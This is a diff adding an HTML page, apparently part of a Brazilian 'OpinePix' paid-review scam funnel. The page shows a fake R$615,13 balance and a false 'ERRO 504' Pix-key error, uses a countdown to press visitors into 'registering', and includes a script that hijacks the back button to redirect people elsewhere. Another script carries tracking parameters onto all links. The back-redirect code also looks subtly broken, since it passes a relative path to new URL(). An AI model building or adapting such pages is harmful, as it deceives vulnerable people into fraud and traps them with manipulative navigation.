@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://i.postimg.cc/XNQ2zzTD/logo.webp">
+    <title>Erro 504 | OpinePix</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+        }
+
+        /* Seção de Logo e Saldo */
+        .header-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background-color: #ffffff;
+        }
+
+        .header-section img {
+            width: 120px;
+        }
+
+        .value-box {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #ffffff;
+            border: 2px solid #1dda01;
+            padding: 10px 20px;
+            border-radius: 10px;
+            background: #00c953;
+        }
+
+        /* Título com Fundo Verde */
+        .highlight-title {
+            background-color: red;
+            color: #ffffff;
+            font-size: 2em;
+            padding: 10px;
+            font-weight: bold;
+            margin: 20px 0;
+            border-radius: 10px;
+        }
+
+        /* Subtítulo */
+        .subtitle {
+            color: #ffffff;
+            font-size: 1.5em;
+            margin: 10px 0;
+        }
+
+        .highlight-green {
+            color: #1dda01;
+            font-weight: bold;
+            font-size: 3em;
+        }
+
+        .highlight-red {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 2em;
+        }
+        /* Contêiner pai para centralizar */
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            /* Isso garante que ocupe toda a altura da página */
+        }
+
+        /* Botão de Desconto */
+        .pulsing-button {
+            display: flex;
+            background-color: #1dda01;
+            color: white;
+            font-weight: bold;
+            padding: 15px 30px;
+            margin: 20px 0;
+            text-decoration: none;
+            border-radius: 5px;
+            animation: pulse 1.5s infinite;
+            justify-content: center;
+            align-items: center;
+            width: 100%; /* Largura do botão */
+        }
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        /* FAQ */
+        .faq-section {
+            background-color: #111;
+            padding: 20px;
+            margin: 20px auto;
+            border-radius: 10px;
+            width: 80%;
+        }
+
+        .faq-item {
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-top: 10px;
+        }
+
+        /* Rodapé */
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+            background-color: #111;
+        }
+
+        .footer img {
+            width: 80px;
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .header-section {
+                flex-direction: row;
+                align-items: center;
+            }
+
+            .header-section img {
+                width: 80px;
+            }
+
+            .value-box {
+                font-size: 1.2em;
+            }
+
+            .highlight-title {
+                font-size: 1.5em;
+            }
+        }
+        /* Contador */
+        .countdown-section {
+        background-color: #ff0000;
+        color: #ffffff;
+        font-weight: bold;
+        padding: 20px;
+        border-radius: 10px;
+        display: inline-block;
+        margin: 20px auto;
+        text-align: center;
+        font-size: 1.5em;
+    }
+
+    #countdown {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .time-box {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin: 0 10px;
+    }
+
+    .time-box span {
+        font-size: 2em;
+    }
+
+    .separator {
+        font-size: 2em;
+        margin: 0 5px;
+    }
+
+    .countdown-section p {
+        margin: 0;
+        font-size: 0.8em;
+    }
+    img.imgpix {
+    max-width: 25px;
+    padding: 10px;
+}
+h1 {
+    color: red;
+}
+    </style>
+</head>
+<body>
+
+    <!-- Seção de Logo e Saldo -->
+    <div class="header-section">
+        <img src="https://i.postimg.cc/XNQ2zzTD/logo.webp" alt="Logo">
+        <div class="value-box">
+            <span>Saldo: </span> <br>R$615,13
+        </div>
+    </div>
+
+    <!-- Título -->
+    <div class="highlight-title">ERRO 504</div>
+
+    <!-- Subtítulo -->
+    <div class="faq-section">
+    <h1>CHAVE PIX NÃO CADASTRADA</h1>
+    <h2 class="subtitle">Parece que você <span style="color:red;">ainda não ativou</span> seu cadastro</h2>
+    <p>Para efetuar o link e também continuar avaliando mais marcas, é necessário realizar seu cadastro!</p>
+    <p>Leva menos de 5 minutos.</p>
+    <p>Depois você já vai conseguir efetuar o link direto para sua chave PIX.</p>
+    <!-- Botão de Desconto -->
+    <div class="container">
+    <a href="../saque" class="pulsing-button"><img class=imgpix src="pix.svg" alt="">REALIZAR MEU CADASTRO</a>
+    </div> 
+    <!-- Opção de sair -->
+    <p><a href="../avabk" style="color:#fff">Não quer acessar ? <span style="color:red;">Clique para sair</span></a></p>
+    <!-- Seção Contador -->
+</div>
+<div class="countdown-section">
+    <p>Este acesso expira em:</p>
+    <div id="countdown">
+        <div class="time-box">
+            <span id="minutes">05</span>
+            <p>minutos</p>
+        </div>
+        <span class="separator">:</span>
+        <div class="time-box">
+            <span id="seconds">00</span>
+            <p>segundos</p>
+        </div>
+    </div>
+</div>
+
+   
+    <!-- Seção de Rodapé -->
+    <div class="footer">
+        <img src="https://i.postimg.cc/c1tgSpHF/image.png" alt="Imagem 1">
+        <img src="https://i.postimg.cc/HsGJs68d/image.png" alt="Imagem 2">
+    </div>
+
+    <script>
+    // Configura o contador regressivo de 10 minutos
+    let time = 300; // 10 minutos em segundos
+    const minutesElement = document.getElementById('minutes');
+    const secondsElement = document.getElementById('seconds');
+
+    function updateCountdown() {
+        const minutes = Math.floor(time / 60).toString().padStart(2, '0');
+        const seconds = (time % 60).toString().padStart(2, '0');
+
+        minutesElement.textContent = minutes;
+        secondsElement.textContent = seconds;
+
+        time--;
+        if (time < 0) clearInterval(timer);
+    }
+
+    const timer = setInterval(updateCountdown, 1000);
+</script>
+<!-- Script Utms -->
+      <script>
+         // Função para adicionar os parâmetros aos links
+         function adicionarParametrosAosLinks() {
+             const urlParams = new URLSearchParams(window.location.search);
+         
+             const links = document.querySelectorAll('a');
+         
+             links.forEach(link => {
+                 const href = new URL(link.href);
+                 urlParams.forEach((value, key) => {
+                     href.searchParams.set(key, value);
+                 });
+                 link.href = href.toString();
+             });
+         }
+         
+         // Chamar a função ao carregar a página
+         document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+      </script>
+      <!-- Script Utms -->
+    <!-- Script Backredirect com Parâmetros -->
+<script>
+    var backRedirectLink = '../avabk';
+    
+    // Função para adicionar parâmetros da URL atual ao link de redirecionamento
+    function adicionarParametrosAoRedirectLink(url) {
+        const urlParams = new URLSearchParams(window.location.search); // pega os parâmetros da URL atual
+        const redirectUrl = new URL(url); // cria uma nova URL baseada no link de redirecionamento
+
+        // Adiciona cada parâmetro da URL atual ao link de redirecionamento
+        urlParams.forEach((value, key) => {
+            redirectUrl.searchParams.set(key, value);
+        });
+        
+        return redirectUrl.toString();
+    }
+
+    // Atualiza o link de redirecionamento com os parâmetros
+    backRedirectLink = adicionarParametrosAoRedirectLink(backRedirectLink);
+
+    // Adiciona a página atual ao histórico
+    history.pushState({}, "", location.href);
+
+    // Manipulador para o evento de navegação para trás
+    window.onpopstate = function(event) {
+        setTimeout(function() {
+            location.href = backRedirectLink;
+        }, 100); // Atraso de 100ms
+    };
+</script>
+<!-- Fim do Script Backredirect -->
+</body>
+</html>
